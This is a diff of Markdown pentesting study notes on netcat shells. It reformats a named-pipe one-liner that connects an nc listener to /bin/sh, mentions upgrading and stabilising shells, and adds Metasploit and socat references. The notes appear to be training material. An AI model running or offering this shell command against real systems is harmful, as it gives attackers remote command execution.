@@ -49,10 +49,13 @@ These are almost, but not quite, mirror images of each other.
 The `-e` switch isn’t available on many UNIX-like OSes. Working around this leads to the common named pipe pattern:
 
 ```bash
-mkfifo /tmp/p; nc -lvnp $LISTENER_PORT < /tmp/p | /bin/sh >/tmp/p 2>&1; rm /tmp/p
+mkfifo /tmp/p; \
+nc -lvnp $LISTENER_PORT < /tmp/p | \
+	/bin/sh >/tmp/p 2>&1; \
+rm /tmp/p
 ```
 
-(Note that it’s also possible to reverse the /bin/sh and nc portions of things; what important is that the named pipe lets us loop I/O between the two applications. See [the discussion of msfvenom payloads](metasploit.md) for a detailed breakdown of this pattern.)
+(Note that it’s also possible to reverse the /bin/sh and nc portions of things; what important is that the named pipe lets us loop I/O between the two applications. See the discussion of msfvenom payloads for a detailed breakdown of this pattern.)
 
 Initial netcat reverse shells (in particular web shells) are non-interactive.
 
@@ -70,15 +73,17 @@ Note that the `stty` command can be canceled using `reset` (after closing the re
 
 You can *mostly* bypass the need for the `stty` command by using `rlwrap`, which sets all of this up for you (though it doesn’t redirect control sequences, so Ctrl+C will still kill the connection).
 
-Or, just fire up [socat](socat.md) from inside of netcat!
+Or, just fire up socat from inside of netcat!
 
 NOTE that in *none* of these cases will the reverse shell pick up on your terminal size, so you’ll need to manually specify it using `stty rows` and `stty cols`.
 
 ## References
 
 * [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
-* [TryHackMe: CC - Pen Testing](tryhackme-cc-pen-testing.md)
+* [TryHackMe: CC: Pen Testing](tryhackme-cc-pen-testing.md)
 * [TryHackMe: Exploiting Log4j](tryhackme-exploiting-log4j.md)
+* [Using Metasploit](metasploit.md)
+* [Using “socat”](socat.md)
 
 - - - -
 
